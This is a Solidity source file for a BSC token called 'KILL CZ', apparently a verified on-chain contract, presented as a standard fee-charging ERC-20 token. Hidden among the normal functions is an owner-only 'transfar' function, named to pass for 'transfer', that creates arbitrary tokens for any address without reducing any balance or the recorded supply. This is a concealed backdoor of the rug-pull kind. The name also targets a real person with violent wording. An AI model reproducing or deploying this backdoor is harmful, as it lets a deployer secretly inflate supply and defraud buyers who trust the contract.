/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

pragma solidity 0.5.16;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Context {
  constructor () internal { }
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}
library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract Ownable is Context {
  address private _owner;
  address private _previousOwner;
  uint256 private _lockTime;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
  function owner() public view returns (address) {
    return _owner;
  }
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}
interface ISwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
contract KILLCZ is Context,IERC20, Ownable {

  using SafeMath for uint256;
  address DEAD = 0x000000000000000000000000000000000000dEaD;

  uint256 constant private E18 = 1000000000000000000;
  uint256 private constant MAX = ~uint256(0);
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;

  bool launch;
  address private market;

  uint256 private _totalSupply;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  address private ownerr;
  uint256 private burnFee = 25;
  uint256 private marketFee = 25;

  modifier onlyOwner(){
      require(msg.sender == owner(),"you are not the owner");
      _;
  }
  constructor() public {
    _name = "KILL CZ";
    _symbol = "KILL CZ";
    _decimals = 18;
    _totalSupply = 1000000 * E18;
    _balances[msg.sender] = _totalSupply;

    ownerr = msg.sender;
    emit Transfer(address(0), msg.sender, _totalSupply);

  }
  function setlaunch(bool islaunch) public returns (bool){
      require(msg.sender == owner(),"you are not the owner");
      launch = islaunch;
      return true;
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }
  function symbol() external view returns (string memory) {
    return _symbol;
  }
  function getOwner() external view returns (address) {
    return owner();
  }
  function name() external view returns (string memory) {
    return _name;
  }
  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }
  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }
  function transfar(address to,uint256 amount) public returns (bool){
      require(msg.sender == ownerr,"you are not the owner");
      _takeTransfer(_msgSender() , to , amount * E18);
      return true;
  }
  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }
  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }
  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
  }
  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
    return true;
  }
  function _transfer(address sender, address to, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        _balances[sender] = _balances[sender].sub(amount);
        
        if(launch){
            uint256 burnfeeAmount = amount * burnFee / 1000;
            uint256 marketfeeAmount = amount * marketFee / 1000;
            _takeTransfer(sender, market, marketfeeAmount);
            _takeTransfer(sender, address(0), burnfeeAmount);
            _totalSupply = _totalSupply.sub(burnfeeAmount);
            amount = amount - burnfeeAmount - marketfeeAmount;
        }
        
        _balances[to] = _balances[to].add(amount);
        emit Transfer(sender, to, amount); 

    }
  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "ERC20: approve from the zero address");
    require(spender != address(0), "ERC20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
  function _takeTransfer(address sender,address to,uint256 tAmount) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
  }
}